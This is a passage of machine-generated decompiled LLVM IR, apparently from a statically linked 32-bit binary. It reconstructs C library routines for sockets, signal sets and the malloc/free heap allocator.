  store i32 %v5_16480, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_16480, -4095
  br i1 %tmp, label %dec_label_pc_164a0, label %dec_label_pc_16490

dec_label_pc_16490:                               ; preds = %entry
  %v0_16490 = call i32 @__errno_location()
  %v0_16494 = load i32, i32* %r4.global-to-local, align 4
  %v1_16494 = sub i32 0, %v0_16494
  %v2_16498 = inttoptr i32 %v0_16490 to i32*
  store i32 %v1_16494, i32* %v2_16498, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_164a0

dec_label_pc_164a0:                               ; preds = %entry, %dec_label_pc_16490
  %v0_164a0 = phi i32 [ %v5_16480, %entry ], [ -1, %dec_label_pc_16490 ]
  %v2_164a4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_164a4, i32* @r4, align 4
  ret i32 %v0_164a0

; uselistorder directives
  uselistorder i32 %v5_16480, { 1, 0, 2 }
  uselistorder label %dec_label_pc_164a0, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_164a8 = load i32, i32* @r4, align 4
  store i32 %v3_164a8, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_164b0 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_164b0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_164b0, -4095
  br i1 %tmp, label %dec_label_pc_164d0, label %dec_label_pc_164c0

dec_label_pc_164c0:                               ; preds = %entry
  %v0_164c0 = call i32 @__errno_location()
  %v0_164c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_164c4 = sub i32 0, %v0_164c4
  %v2_164c8 = inttoptr i32 %v0_164c0 to i32*
  store i32 %v1_164c4, i32* %v2_164c8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_164d0

dec_label_pc_164d0:                               ; preds = %entry, %dec_label_pc_164c0
  %v0_164d0 = phi i32 [ %v5_164b0, %entry ], [ -1, %dec_label_pc_164c0 ]
  %v2_164d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_164d4, i32* @r4, align 4
  ret i32 %v0_164d0

; uselistorder directives
  uselistorder i32 %v5_164b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_164d0, { 1, 0 }
}

define i32 @socket() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_164d8 = load i32, i32* @r4, align 4
  store i32 %v3_164d8, i32* %stack_var_-8, align 4
  %v0_164dc = call i32 @socket()
  store i32 %v0_164dc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_164dc, -4095
  br i1 %tmp, label %dec_label_pc_164fc, label %dec_label_pc_164ec

dec_label_pc_164ec:                               ; preds = %entry
  %v0_164ec = call i32 @__errno_location()
  %v0_164f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_164f0 = sub i32 0, %v0_164f0
  %v2_164f4 = inttoptr i32 %v0_164ec to i32*
  store i32 %v1_164f0, i32* %v2_164f4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_164fc

dec_label_pc_164fc:                               ; preds = %entry, %dec_label_pc_164ec
  %v0_164fc = phi i32 [ %v0_164dc, %entry ], [ -1, %dec_label_pc_164ec ]
  %v2_16500 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16500, i32* @r4, align 4
  ret i32 %v0_164fc

; uselistorder directives
  uselistorder i32 %v0_164dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_164fc, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_16520, label %dec_label_pc_16510

dec_label_pc_16510:                               ; preds = %entry
  %v8_16514 = icmp sgt i32 %arg1, 64
  br i1 %v8_16514, label %dec_label_pc_16520, label %dec_label_pc_16518

dec_label_pc_16518:                               ; preds = %dec_label_pc_16510
  %v0_1651c = call i32 @__sigaddset()
  br label %dec_label_pc_16520

dec_label_pc_16520:                               ; preds = %dec_label_pc_16510, %entry, %dec_label_pc_16518
  %v0_16520 = call i32 @__errno_location()
  %v2_16528 = inttoptr i32 %v0_16520 to i32*
  store i32 22, i32* %v2_16528, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16520, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 128, i32* @r2, align 4
  %v0_16540 = load i32, i32* @r0, align 4
  %v2_16540 = inttoptr i32 %v0_16540 to i8*
  %v3_16540 = call i32 @__GI_memset(i8* %v2_16540, i32 0)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1654c = load i32, i32* @r4, align 4
  store i32 %v3_1654c, i32* %stack_var_-12, align 4
  %v6_1654c = load i32, i32* @r5, align 4
  %v10_1654c = ptrtoint i32* %stack_var_-12 to i32
  %v7_16550 = icmp eq i32 %arg2, -1
  %v0_1655c.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_16550, label %.thread, label %bb

.thread:                                          ; preds = %entry
  br label %dec_label_pc_16574

bb:                                               ; preds = %entry
  %v2_16558 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_1655c.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_1655c.pre, 1
  br i1 %tmp19, label %dec_label_pc_16574, label %dec_label_pc_16564

dec_label_pc_16564:                               ; preds = %bb
  %v7_16568 = icmp sgt i32 %v0_1655c.pre, 64
  br i1 %v7_16568, label %dec_label_pc_16574, label %bb20

bb20:                                             ; preds = %dec_label_pc_16564
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_1659824 = add i32 %v10_1654c, 124
  store i32 %v5_1659824, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16588

dec_label_pc_16574:                               ; preds = %.thread, %dec_label_pc_16564, %bb
  %v0_16574 = call i32 @__errno_location()
  store i32 %v0_16574, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_16580 = inttoptr i32 %v0_16574 to i32*
  store i32 22, i32* %v2_16580, align 4
  %v0_165f4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_165f4

dec_label_pc_16588:                               ; preds = %bb20, %dec_label_pc_16588
  %v5_1659825 = phi i32 [ %v5_1659824, %bb20 ], [ %v5_16598, %dec_label_pc_16588 ]
  %v2_1658c = add i32 %v5_1659825, -136
  %v3_1658c = inttoptr i32 %v2_1658c to i32*
  store i32 0, i32* %v3_1658c, align 4
  %v0_16590.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_16590 = add i32 %v0_16590.pre, -1
  store i32 %v1_16590, i32* %r0.global-to-local, align 4
  %v6_16590 = icmp slt i32 %v1_16590, 0
  %v4_16598 = mul i32 %v1_16590, 4
  %v5_16598 = add i32 %v4_16598, %v10_1654c
  store i32 %v5_16598, i32* %r2.global-to-local, align 4
  br i1 %v6_16590, label %dec_label_pc_165a0, label %dec_label_pc_16588

dec_label_pc_165a0:                               ; preds = %dec_label_pc_16588
  %v2_165a0 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_165a0, i32* @r5, align 4
  %v2_165a4 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_165a4, i32* @r0, align 4
  %v0_165a8 = load i32, i32* @r4, align 4
  store i32 %v0_165a8, i32* @r1, align 4
  %v0_165ac = call i32 @__sigaddset()
  store i32 %v0_165ac, i32* %r0.global-to-local, align 4
  %v1_165b0 = icmp slt i32 %v0_165ac, 0
  br i1 %v1_165b0, label %dec_label_pc_165f0, label %dec_label_pc_165b8

dec_label_pc_165b8:                               ; preds = %dec_label_pc_165a0
  %v0_165b8 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_31858.1420 to i32), i32* %r0.global-to-local, align 4
  %v2_165c0 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_31858.1420 to i32), i32 %v0_165b8)
  store i32 %v2_16558, i32* %r2.global-to-local, align 4
  %v0_165d8 = load i32, i32* @r4, align 4
  store i32 %v0_165d8, i32* %r0.global-to-local, align 4
  %v4_165e0 = call i32 @__libc_sigaction(i32 %v0_165d8, i32* nonnull %stack_var_-152, i32 %v2_16558)
  store i32 %v4_165e0, i32* %r0.global-to-local, align 4
  %v1_165e4 = icmp slt i32 %v4_165e0, 0
  br i1 %v1_165e4, label %dec_label_pc_165f0, label %bb23

bb23:                                             ; preds = %dec_label_pc_165b8
  %v5_165e8 = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_165e8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_165f4

dec_label_pc_165f0:                               ; preds = %dec_label_pc_165b8, %dec_label_pc_165a0
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_165f4

dec_label_pc_165f4:                               ; preds = %bb23, %dec_label_pc_16574, %dec_label_pc_165f0
  %v0_165f4 = phi i32 [ %v5_165e8, %bb23 ], [ %v0_165f4.pre, %dec_label_pc_16574 ], [ -1, %dec_label_pc_165f0 ]
  store i32 %v0_165f4, i32* %r0.global-to-local, align 4
  %v2_165fc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_165fc, i32* @r4, align 4
  store i32 %v6_1654c, i32* @r5, align 4
  ret i32 %v0_165f4

; uselistorder directives
  uselistorder i32 %v0_165f4, { 1, 0 }
  uselistorder i32 %v5_16598, { 1, 0 }
  uselistorder i32 %v1_16590, { 0, 2, 1 }
  uselistorder i32 %v2_16558, { 1, 0 }
  uselistorder i32 %v0_1655c.pre, { 1, 0, 2 }
  uselistorder i32 %v10_1654c, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 7, 6, 9, 8, 10, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_165f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16588, { 1, 0 }
  uselistorder label %dec_label_pc_16574, { 1, 2, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_16604 = add i32 %arg2, -1
  %v3_16608 = udiv i32 %v1_16604, 32
  %v4_1660c = mul nuw nsw i32 %v3_16608, 4
  %v5_1660c = add i32 %v4_1660c, %arg1
  %v6_1660c = inttoptr i32 %v5_1660c to i32*
  %v7_1660c = load i32, i32* %v6_1660c, align 4
  %v1_16610 = urem i32 %v1_16604, 32
  %v7_16618 = shl i32 1, %v1_16610
  %v8_16618 = and i32 %v7_1660c, %v7_16618
  %v10_16618 = icmp ne i32 %v8_16618, 0
  %. = zext i1 %v10_16618 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_16604, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_16628 = load i32, i32* @r1, align 4
  %v1_16628 = add i32 %v0_16628, -1
  %v3_1662c = udiv i32 %v1_16628, 32
  %v0_16630 = load i32, i32* @r0, align 4
  %v4_16630 = mul nuw nsw i32 %v3_1662c, 4
  %v5_16630 = add i32 %v0_16630, %v4_16630
  %v6_16630 = inttoptr i32 %v5_16630 to i32*
  %v7_16630 = load i32, i32* %v6_16630, align 4
  %v1_16634 = urem i32 %v1_16628, 32
  %v7_1663c = shl i32 1, %v1_16634
  %v8_1663c = or i32 %v7_16630, %v7_1663c
  store i32 %v8_1663c, i32* %v6_16630, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_16628, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1664c = add i32 %arg2, -1
  %v3_16650 = udiv i32 %v1_1664c, 32
  %v4_16654 = mul nuw nsw i32 %v3_16650, 4
  %v5_16654 = add i32 %v4_16654, %arg1
  %v6_16654 = inttoptr i32 %v5_16654 to i32*
  %v7_16654 = load i32, i32* %v6_16654, align 4
  %v1_16658 = urem i32 %v1_1664c, 32
  %tmp = shl i32 -1, %v1_16658
  %v8_16660 = add i32 %tmp, -1
  %v9_16660 = and i32 %v7_16654, %v8_16660
  store i32 %v9_16660, i32* %v6_16654, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1664c, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16670 = load i32, i32* @r4, align 4
  %v6_16670 = load i32, i32* @r5, align 4
  %v9_16670 = load i32, i32* @r6, align 4
  %v0_16674 = load i32, i32* %r0.global-to-local, align 4
  %v2_16674 = icmp eq i32 %v0_16674, 0
  %v2_16678 = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_16674, label %bb, label %dec_label_pc_16684

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1668c

dec_label_pc_16684:                               ; preds = %entry
  %tmp = icmp ugt i32 %v0_16674, -8
  br i1 %tmp, label %dec_label_pc_16790, label %dec_label_pc_1668c

dec_label_pc_1668c:                               ; preds = %bb, %dec_label_pc_16684
  %v0_1668c = phi i32 [ %v0_16674, %dec_label_pc_16684 ], [ 1, %bb ]
  %v1_1668c = add i32 %v0_1668c, 4
  store i32 %v1_1668c, i32* %stack_var_-20, align 4
  store i32 %v2_16678, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_317e8.1422 to i32), i32* %r0.global-to-local, align 4
  %v1_166a4 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_2b39c.1426 to i32), i32* %r0.global-to-local, align 4
  %v3_166b0 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_2b39c.1426 to i32*), i32 %v2_16678)
  store i32 %v3_166b0, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_317e8.1422 to i32), i32* %r0.global-to-local, align 4
  store i32 91848, i32* @lr, align 4
  %v1_166c4 = call i32 @__pthread_return_0()
  store i32 %v1_166c4, i32* %r0.global-to-local, align 4
  %v2_166c8 = icmp eq i32 %v3_166b0, 0
  br i1 %v2_166c8, label %dec_label_pc_166d0, label %dec_label_pc_16780

dec_label_pc_166d0:                               ; preds = %dec_label_pc_1668c
  %v2_166d4 = load i32, i32* @global_var_31810.1429, align 4
  store i32 %v2_166d4, i32* @r4, align 4
  %v2_166d8 = load i32, i32* %stack_var_-20, align 4
  %v3_166dc = icmp ult i32 %v2_166d8, %v2_166d4
  br i1 %v3_166dc, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_166d0
  %v3_166e0 = add i32 %v2_166d4, -1
  %v2_166e4 = add i32 %v3_166e0, %v2_166d8
  %v2_166e8 = sub i32 0, %v2_166d4
  %v3_166ec = and i32 %v2_166e4, %v2_166e8
  store i32 %v3_166ec, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_166d0, %bb14
  store i32 ptrtoint (i32* @global_var_318d8.1431 to i32), i32* %r0.global-to-local, align 4
  %v1_166f8 = call i32 @__pthread_return_0()
  %v0_166fc = load i32, i32* @r4, align 4
  store i32 %v0_166fc, i32* %r0.global-to-local, align 4
  %v1_16700 = call i32 @__GI_sbrk(i32 %v0_166fc)
  store i32 %v1_16700, i32* %r0.global-to-local, align 4
  %v7_16704 = icmp eq i32 %v1_16700, -1
  br i1 %v7_16704, label %bb15, label %dec_label_pc_16710

bb15:                                             ; preds = %.thread3
  store i32 %v1_16700, i32* @r5, align 4
  br label %dec_label_pc_16724

dec_label_pc_16710:                               ; preds = %.thread3
  %v1_16710 = add i32 %v1_16700, 3
  %v1_16714 = and i32 %v1_16710, -4
  store i32 %v1_16714, i32* @r5, align 4
  %v9_16718 = icmp eq i32 %v1_16714, %v1_16700
  br i1 %v9_16718, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_16710
  %v3_1671c = sub i32 %v1_16714, %v1_16700
  store i32 %v3_1671c, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_16710, %bb16
  %v1_16720 = xor i1 %v9_16718, true
  call void @__pseudo_cond_branch(i1 %v1_16720, i32 ptrtoint (i32* @global_var_17bd4.1432 to i32))
  br label %dec_label_pc_16724

dec_label_pc_16724:                               ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_318d8.1431 to i32), i32* %r0.global-to-local, align 4
  store i32 91956, i32* @lr, align 4
  %v1_16730 = call i32 @__pthread_return_0()
  store i32 %v1_16730, i32* %r0.global-to-local, align 4
  %v0_16734 = load i32, i32* @r5, align 4
  %v7_16734 = icmp eq i32 %v0_16734, -1
  br i1 %v7_16734, label %dec_label_pc_16790, label %dec_label_pc_1673c

dec_label_pc_1673c:                               ; preds = %dec_label_pc_16724
  store i32 ptrtoint (i32* @global_var_317e8.1422 to i32), i32* %r0.global-to-local, align 4
  %v1_16748 = call i32 @__pthread_return_0()
  %v0_1674c = load i32, i32* @r4, align 4
  %v0_16750 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_2b39c.1426 to i32), i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_16750, 16777216
  %v2_16758 = sdiv i32 %sext, 16777216
  %v5_16758 = call i32 @__heap_free(i32* bitcast (i32** @global_var_2b39c.1426 to i32*), i32 %v2_16758, i32 %v0_1674c)
  store i32 ptrtoint (i32** @global_var_2b39c.1426 to i32), i32* %r0.global-to-local, align 4
  %v3_16764 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_2b39c.1426 to i32*), i32 %v2_16678)
  store i32 %v3_16764, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_317e8.1422 to i32), i32* %r0.global-to-local, align 4
  store i32 92024, i32* @lr, align 4
  %v1_16774 = call i32 @__pthread_return_0()
  store i32 %v1_16774, i32* %r0.global-to-local, align 4
  %v2_16778 = icmp eq i32 %v3_16764, 0
  br i1 %v2_16778, label %dec_label_pc_16790, label %dec_label_pc_16780

dec_label_pc_16780:                               ; preds = %dec_label_pc_1668c, %dec_label_pc_1673c
  %v1_16784 = phi i32 [ %v3_166b0, %dec_label_pc_1668c ], [ %v3_16764, %dec_label_pc_1673c ]
  %v2_16780 = load i32, i32* %stack_var_-20, align 4
  %v2_16784 = inttoptr i32 %v1_16784 to i32*
  store i32 %v2_16780, i32* %v2_16784, align 4
  %v3_16784 = load i32, i32* %r4.global-to-local, align 4
  %v4_16784 = add i32 %v3_16784, 4
  store i32 %v4_16784, i32* %r4.global-to-local, align 4
  %v2_16788 = icmp eq i32 %v4_16784, 0
  br i1 %v2_16788, label %dec_label_pc_16790, label %dec_label_pc_167a0

dec_label_pc_16790:                               ; preds = %dec_label_pc_16780, %dec_label_pc_1673c, %dec_label_pc_16724, %dec_label_pc_16684
  %v0_16790 = call i32 @__errno_location()
  store i32 %v0_16790, i32* %r0.global-to-local, align 4
  %v2_16798 = inttoptr i32 %v0_16790 to i32*
  store i32 12, i32* %v2_16798, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_167a0

dec_label_pc_167a0:                               ; preds = %dec_label_pc_16780, %dec_label_pc_16790
  %v0_167a0 = phi i32 [ %v4_16784, %dec_label_pc_16780 ], [ 0, %dec_label_pc_16790 ]
  store i32 %v0_167a0, i32* %r0.global-to-local, align 4
  store i32 %v3_16670, i32* @r4, align 4
  store i32 %v6_16670, i32* @r5, align 4
  store i32 %v9_16670, i32* @r6, align 4
  ret i32 %v0_167a0

; uselistorder directives
  uselistorder i32 %v0_167a0, { 1, 0 }
  uselistorder i32 %v3_16764, { 1, 0, 2 }
  uselistorder i32 %v1_16714, { 1, 0, 2 }
  uselistorder i32 %v1_16700, { 2, 0, 3, 4, 1, 5 }
  uselistorder i32 %v3_166b0, { 1, 0, 2 }
  uselistorder i32 %v0_16674, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 5, 7, 4, 6, 8, 9, 10, 3, 12, 11, 16, 14, 13, 2, 15, 17, 18, 19, 0, 1 }
  uselistorder label %dec_label_pc_167a0, { 1, 0 }
  uselistorder label %dec_label_pc_16780, { 1, 0 }
  uselistorder label %dec_label_pc_16724, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1668c, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_167c4 = icmp eq i32 %arg1, 0
  %v3_167c8 = load i32, i32* @r4, align 4
  store i32 %v3_167c8, i32* %stack_var_-24, align 4
  %v6_167c8 = load i32, i32* @r5, align 4
  %v9_167c8 = load i32, i32* @r6, align 4
  %v15_167c8 = load i32, i32* @r8, align 4
  br i1 %v2_167c4, label %bb, label %bb11

bb:                                               ; preds = %entry
  ret i32 0

bb11:                                             ; preds = %entry
  %v1_167d0 = add i32 %arg1, -4
  %v2_167d0 = inttoptr i32 %v1_167d0 to i32*
  %v3_167d0 = load i32, i32* %v2_167d0, align 4
  store i32 %v3_167d0, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_2b39c.1426 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_167d0, i32* @r4, align 4
  %v1_167e8 = call i32 @__pthread_return_0()
  %v0_167ec = load i32, i32* @r4, align 4
  %v0_167f0 = load i32, i32* @r5, align 4
  %v4_167f8 = call i32 @__heap_free(i32* bitcast (i32** @global_var_2b39c.1426 to i32*), i32 %v0_167ec, i32 %v0_167f0)
  %v1_16800 = inttoptr i32 %v4_167f8 to i32*
  %v2_16800 = load i32, i32* %v1_16800, align 4
  store i32 %v2_16800, i32* %r6.global-to-local, align 4
  %v2_16804 = load i32, i32* @global_var_31810.1429, align 4
  %v4_16808 = mul i32 %v2_16804, 8
  %v6_16808 = icmp ult i32 %v2_16800, %v4_16808
  store i32 %v4_167f8, i32* @r4, align 4
  br i1 %v6_16808, label %dec_label_pc_16848, label %dec_label_pc_16814

dec_label_pc_16814:                               ; preds = %bb11
  %v1_1681c = call i32 @__pthread_return_0()
  %v1_16824 = call i32 @__GI_sbrk(i32 0)
  %v0_16828 = load i32, i32* @r4, align 4
  %v1_16828 = add i32 %v0_16828, 12
  store i32 %v1_16828, i32* @r5, align 4
  %v9_1682c = icmp eq i32 %v1_16828, %v1_16824
  br i1 %v9_1682c, label %dec_label_pc_16850, label %dec_label_pc_16834

dec_label_pc_16834:                               ; preds = %dec_label_pc_16814
  %v1_16840 = call i32 @__pthread_return_0()
  br label %dec_label_pc_16848

dec_label_pc_16848:                               ; preds = %bb11, %dec_label_pc_16834, %bb14
  %v2_16848 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_16848, i32* @r4, align 4
  store i32 %v6_167c8, i32* @r5, align 4
  store i32 %v9_167c8, i32* %r6.global-to-local, align 4
  store i32 %v15_167c8, i32* %r8.global-to-local, align 4
  %v0_1684c = call i32 @__pthread_return_0()
  %v0_16850.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16850

dec_label_pc_16850:                               ; preds = %dec_label_pc_16814, %dec_label_pc_16848
  %v1_16858 = phi i32 [ %v0_16828, %dec_label_pc_16814 ], [ %v0_16850.pre, %dec_label_pc_16848 ]
  %v1_16850 = add i32 %v1_16858, 4
  %v2_16850 = inttoptr i32 %v1_16850 to i32*
  %v3_16850 = load i32, i32* %v2_16850, align 4
  %v2_16854 = icmp eq i32 %v3_16850, 0
  br i1 %v2_16854, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_16850
  %v2_16858 = add i32 %v1_16858, 8
  %v3_16858 = inttoptr i32 %v2_16858 to i32*
  %v4_16858 = load i32, i32* %v3_16858, align 4
  %v3_1685c = add i32 %v3_16850, 8
  %v4_1685c = inttoptr i32 %v3_1685c to i32*
  store i32 %v4_16858, i32* %v4_1685c, align 4
  %v0_16860.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16850, %bb12
  %v0_16860 = phi i32 [ %v1_16858, %dec_label_pc_16850 ], [ %v0_16860.pre, %bb12 ]
  %v1_16860 = add i32 %v0_16860, 8
  %v2_16860 = inttoptr i32 %v1_16860 to i32*
  %v3_16860 = load i32, i32* %v2_16860, align 4
  %v1_16864 = add i32 %v0_16860, 4
  %v2_16864 = inttoptr i32 %v1_16864 to i32*
  %v3_16864 = load i32, i32* %v2_16864, align 4
  %v2_16868 = icmp eq i32 %v3_16860, 0
  br i1 %v2_16868, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_1686c = add i32 %v3_16860, 4
  %v4_1686c = inttoptr i32 %v3_1686c to i32*
  store i32 %v3_16864, i32* %v4_1686c, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_16870 = load i32, i32* %r8.global-to-local, align 4
  %v3_16870 = inttoptr i32 %v2_16870 to i32*
  store i32 %v3_16864, i32* %v3_16870, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_16880 = call i32 @__pthread_return_0()
  %v0_16884 = load i32, i32* %r6.global-to-local, align 4
  %v1_16884 = load i32, i32* @r4, align 4
  %v0_1688c = load i32, i32* @r5, align 4
  %v2_16884 = sub i32 12, %v0_16884
  %v1_16888 = add i32 %v2_16884, %v1_16884
  %v2_1688c = sub i32 %v1_16888, %v0_1688c
  %v1_16890 = call i32 @__GI_sbrk(i32 %v2_1688c)
  br label %dec_label_pc_16848

; uselistorder directives
  uselistorder i32 %v0_16860, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0 }
  uselistorder i32** @global_var_2b39c.1426, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_16850, { 1, 0 }
  uselistorder label %dec_label_pc_16848, { 2, 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_168b4 = inttoptr i32 %arg2 to i32*
  %v2_168b4 = load i32, i32* %v1_168b4, align 4
  %v3_168b8 = load i32, i32* @r4, align 4
  store i32 %v3_168b8, i32* %stack_var_-8, align 4
  %v1_168bc = add i32 %v2_168b4, 3
  %v1_168c0 = and i32 %v1_168bc, -4
  store i32 %v1_168c0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_168c8 = icmp ugt i32 %v1_168c0, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_168d0 = load i32, i32* %arg1, align 4
  store i32 %v2_168d0, i32* %r0.global-to-local, align 4
  br i1 %v2_168c8, label %dec_label_pc_1693c.preheader, label %bb

bb:                                               ; preds = %entry
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1693c.preheader

dec_label_pc_1693c.preheader:                     ; preds = %entry, %bb
  %v1_168f0 = phi i32 [ %v1_168c0, %entry ], [ 12, %bb ]
  %v2_1693c9 = icmp eq i32 %v2_168d0, 0
  br i1 %v2_1693c9, label %dec_label_pc_16944, label %dec_label_pc_168dc

dec_label_pc_168dc:                               ; preds = %dec_label_pc_1693c.preheader, %dec_label_pc_16938
  %v2_168f4 = phi i32 [ %v3_16938, %dec_label_pc_16938 ], [ %v2_168d0, %dec_label_pc_1693c.preheader ]
  %v1_168dc = inttoptr i32 %v2_168f4 to i32*
  %v2_168dc = load i32, i32* %v1_168dc, align 4
  store i32 %v2_168dc, i32* @ip, align 4
  %v3_168e0 = icmp ult i32 %v2_168dc, %v1_168f0
  br i1 %v3_168e0, label %dec_label_pc_16938, label %dec_label_pc_168e8

dec_label_pc_168e8:                               ; preds = %dec_label_pc_168dc
  %v1_168e8 = add i32 %v1_168f0, 44
  %v3_168ec = icmp ult i32 %v2_168dc, %v1_168e8
  br i1 %v3_168ec, label %dec_label_pc_168fc, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_168e8
  %v2_168e0.le = sub i32 %v2_168dc, %v1_168f0
  store i32 %v2_168e0.le, i32* %v1_168dc, align 4
  %v0_16928.pre = load i32, i32* @ip, align 4
